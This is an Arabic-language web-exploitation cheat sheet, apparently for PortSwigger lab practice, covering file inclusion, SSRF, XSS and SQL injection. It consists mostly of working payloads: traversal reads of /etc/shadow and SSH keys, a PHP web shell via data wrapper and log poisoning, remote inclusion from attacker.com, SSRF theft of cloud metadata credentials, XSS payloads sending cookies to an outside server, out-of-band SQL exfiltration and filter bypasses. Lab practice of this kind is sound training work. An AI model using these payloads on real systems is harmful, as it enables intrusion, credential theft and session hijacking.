### 1. **File Inclusion** (LFI / RFI / Path Traversal)

**الفكرة الأساسية**  
الموقع بياخد اسم ملف منك (في parameter زي ?file= أو ?page=) وبيحطه في دالة زي `include()` أو `file_get_contents()` بدون فلترة، فتقدري تغيري المسار وتوصلي لملفات تانية (حتى خارج مجلد الويب).

**الأنواع الرئيسية**

| النوع                       | وصف                                       | الخطورة         | مثال payload أساسي                    | Bypass شائع 2026                                  |
| --------------------------- | ----------------------------------------- | --------------- | ------------------------------------- | ------------------------------------------------- |
| Path Traversal              | طلع لفوق بالـ `../` عشان تقرأي ملفات نظام | Medium → High   | `?file=../../../../etc/passwd`        | `....//` , `..%2f` , `%c0%ae%c0%ae/`              |
| Local File Inclusion (LFI)  | يشمل ملف محلي على السيرفر                 | High → Critical | `?lang=../../../../etc/passwd`        | `php://filter/convert.base64-encode/resource=...` |
| Remote File Inclusion (RFI) | يجيب ملف من الإنترنت (نادر جدًا دلوقتي)   | Critical (RCE)  | `?lang=http://attacker.com/shell.txt` | لازم `allow_url_include = On` (قليل جدًا)         |

**ملفات مهمة تجربيها دايمًا (Linux)**  
```
/etc/passwd
/etc/shadow (لو readable)
/proc/self/environ
/proc/version
/var/log/apache2/access.log (log poisoning)
/var/www/html/config.php
/home/www-data/.ssh/id_rsa
```

**في ويندوز**  
```
../../../../windows/win.ini
../../../../boot.ini
../../../../windows/system32/drivers/etc/hosts
```

**أقوى Wrappers في LFI (2026)**  
- Base64 read: `php://filter/convert.base64-encode/resource=../../../../etc/passwd`  
  (يطلعلك الملف base64، decode بعدين)
- Expect wrapper (RCE): `expect://id` (لو expect extension مفعل – نادر)
- Data wrapper (RCE): `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=`

**Log Poisoning → RCE (أشهر طريقة في labs)**  
1. أرسلي User-Agent خبيث:
   ```
   <?php system($_GET['cmd']); ?>
   ```
   في header User-Agent (بـ Burp أو curl).
2. بعدين include اللوغ:
   ```
   ?file=/var/log/apache2/access.log&cmd=id
   ```

**أدوات مفيدة**  
- Burp Repeater + Intruder (أفضل للتجربة اليدوية)
- ffuf: `ffuf -u "http://target/?file=FUZZ" -w LFI-Jhaddix.txt -mc 200`
- LFISuite / fimap (GitHub)
- dotdotpwn (متخصص في traversal bypass)

**Labs في PortSwigger**  
- File path traversal, simple case
- Traversal sequences stripped non-recursively
- Traversal sequences stripped with superfluous URL-decode
- File inclusion, simple case
- File inclusion, advanced (log poisoning, wrappers)

### 2. **SSRF (Server-Side Request Forgery)**

**الفكرة**  
الموقع بياخد URL منك (في parameter زي ?url= أو ?stockApi=) وبيروح يجيب منه، فتقدري تخليه يروح يجيب حاجات داخلية (localhost, internal IPs, metadata).

**أنواعه**
- **Regular SSRF**: الرد بيرجع لك (تقدري تشوفي المحتوى).
- **Blind SSRF**: مفيش رد مرئي، بس تقدري تثبتيها بـ Burp Collaborator أو requestbin.

**أهداف شائعة**
- `http://localhost/admin`
- `http://127.0.0.1:8080`
- Cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Internal services: `http://192.168.0.x/admin`

**Bypass الـ Blacklist**
- `127.0.0.1` → `127.1`, `0`, `0.0.0.0`, `2130706433`, `[::1]`, `127.0.0.1.nip.io`
- `localhost` → `localtest.me`, `spoofed.burpcollaborator.net`

**Bypass الـ Whitelist**
- `https://allowed.com.evil.com`
- `https://allowed.com@evil.com`
- `https://allowed.com#evil.com`
- Open Redirect chain: `https://allowed.com/redirect?url=http://169.254.169.254`

**Blind SSRF – إزاي تكتشفيها**
- استخدمي Burp Collaborator → حطي subdomain بتاعه في الـ parameter.
- لو جالك DNS/HTTP interaction → Blind SSRF مؤكد.

**Labs في PortSwigger**
- Basic SSRF
- Blind SSRF with out-of-band detection
- SSRF with whitelist-based input filter
- SSRF with blacklist-based input filter
- Full SSRF + cloud metadata

### 3. **XSS (Cross-Site Scripting)** – كل الأنواع

**Reflected XSS**
- Payload في URL → يرجع فورًا.
- أشهر PoC: `<svg onload=alert(1)>`
- Session steal: `<script>fetch('https://your-server?c='+btoa(document.cookie))</script>`

**Stored XSS**
- Payload يتخزن (comment, profile, review).
- أخطر: يصيب كل اللي يشوف الصفحة (حتى admins).
- PoC: `<img src=x onerror=fetch('https://your-server?c='+btoa(document.cookie))>`

**DOM-based XSS**
- كله في الـ browser (location.hash, document.URL...).
- Sinks خطيرة: innerHTML, document.write, eval.
- أداة: Burp DOM Invader (أفضل في 2026).
- PoC: `#<img src=1 onerror=alert(1)>`

**Blind XSS**
- Payload يتخزن في مكان admins فقط (logs, support tickets).
- استخدمي XSS Hunter Express أو Burp Collaborator.
- PoC: `<script src="https://your-collaborator.xss.ht"></script>`

**XSS Bypass (2026 Trends)**
- Mixed case: `oNerrOr=alert(1)`
- Event handlers: `ontoggle`, `onpointerover`, `onbeforetoggle`
- Template literals: ``javascript:alert(1)``
- SVG: `<svg><animatetransform onbegin=alert(1)>`
- Polyglots: `jaVasCript:alert(1)`

**Labs في PortSwigger**
- Reflected XSS into HTML context
- Stored XSS into HTML context
- DOM-based XSS
- Blind XSS into feedback form

### 4. **SQL Injection** – كل الأنواع

**كشف الثغرة**
- `'`, `"`, `')`, `--` → لو خطأ SQL → موجودة.
- `admin'--` في login → لو دخلتي → auth bypass.

**Union-Based**
- حددي عدد الأعمدة: `1' UNION SELECT 1,2,3--`
- جيب database(): `0' UNION SELECT 1,2,database()--`
- جيب جداول: `0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--`

**Blind Boolean-Based**
- `admin' AND substring(database(),1,1)='s'--` → لو رد مختلف → الحرف صح.

**Blind Time-Based**
- `admin' AND IF(1=1,SLEEP(5),0)--` → لو تأخرت 5 ثواني → نجح.

**Out-of-Band (OOB)**
- `admin' AND (SELECT LOAD_FILE(concat('\\\\',database(),'.attacker.com\\foo'))) --`
- أو DNS exfil: `admin' AND (SELECT extractvalue(1,concat(0x3a,database())))--`

**أدوات**
- SQLMap: `sqlmap -u URL --batch --dbs`
- Burp Intruder + SQLi wordlists
- Manual مع Repeater

